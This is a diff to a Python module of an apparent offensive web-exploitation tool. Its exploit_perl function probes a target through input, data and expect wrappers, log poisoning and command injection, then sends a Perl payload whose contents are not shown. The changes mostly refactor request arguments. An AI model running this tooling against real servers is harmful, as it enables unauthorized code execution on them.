@@ -1,7 +1,7 @@
+"""Perl payload"""
 from src.httpreqs import request
 from src.configs import config
 from src.utils.encodings import encode
-from src.utils.args_check import headers
 from src.utils.arguments import args
 from src.attacks.logPoison import exploit_log_poison
 from src.utils.info import printInfo
@@ -31,6 +31,7 @@ def exploit_perl(exploit, method, ip, port):
             "",
             "",
         )
+
         if "/bin" in res.text and "/perl" in res.text:
             u = url.replace(config.tempArg, encode(perlPayload))
             printInfo(ip, port, "perl", "input wrapper")
@@ -38,6 +39,7 @@ def exploit_perl(exploit, method, ip, port):
                 u, args.httpheaders, exploit["POSTVAL"], config.proxies, "", ""
             )
             return True
+
     if method == "DATA":
         if args.postreq:
             res, _ = request.REQUEST(
@@ -52,9 +54,10 @@ def exploit_perl(exploit, method, ip, port):
             res, _ = request.REQUEST(
                 url.replace(config.tempArg, encode(perlTest)),
                 args.httpheaders,
-                config.proxies,
-                "",
-                "",
+                postData="",
+                proxy=config.proxies,
+                exploitType="",
+                exploitMethod="",
             )
         if "/bin" in res.text and "/perl" in res.text:
             printInfo(ip, port, "perl", "data wrapper")
@@ -71,11 +74,13 @@ def exploit_perl(exploit, method, ip, port):
                 request.REQUEST(
                     url.replace(config.tempArg, encode(perlPayload)),
                     args.httpheaders,
-                    config.proxies,
                     "",
-                    "",
+                    proxy=config.proxies,
+                    exploitType="",
+                    exploitMethod="",
                 )
             return True
+
     if method == "EXPECT":
         if args.postreq:
             res, _ = request.REQUEST(
@@ -90,10 +95,12 @@ def exploit_perl(exploit, method, ip, port):
             res, _ = request.REQUEST(
                 url.replace(config.tempArg, encode(perlTest)),
                 args.httpheaders,
-                config.proxies,
                 "",
-                "",
+                proxy=config.proxies,
+                exploitType="",
+                exploitMethod="",
             )
+
         if "/bin" in res.text and "/perl" in res.text:
             printInfo(ip, port, "perl", "expect wrapper")
             if args.postreq:
@@ -109,11 +116,13 @@ def exploit_perl(exploit, method, ip, port):
                 request.REQUEST(
                     url.replace(config.tempArg, encode(perlPayload)),
                     args.httpheaders,
-                    config.proxies,
                     "",
-                    "",
+                    proxy=config.proxies,
+                    exploitType="",
+                    exploitMethod="",
                 )
             return True
+
     if method == "TRUNC":
         exploit_log_poison(
             ip,
@@ -141,10 +150,12 @@ def exploit_perl(exploit, method, ip, port):
             res, _ = request.REQUEST(
                 url.replace(config.tempArg, encode(perlTest)),
                 args.httpheaders,
-                config.proxies,
                 "",
-                "",
+                proxy=config.proxies,
+                exploitType="",
+                exploitMethod="",
             )
+
         if "/bin" in res.text and "/perl" in res.text:
             printInfo(ip, port, "perl", "command injection")
             if args.postreq:
@@ -160,8 +171,9 @@ def exploit_perl(exploit, method, ip, port):
                 request.REQUEST(
                     url.replace(config.tempArg, encode(perlPayload)),
                     args.httpheaders,
-                    config.proxies,
                     "",
-                    "",
+                    proxy=config.proxies,
+                    exploitType="",
+                    exploitMethod="",
                 )
             return True
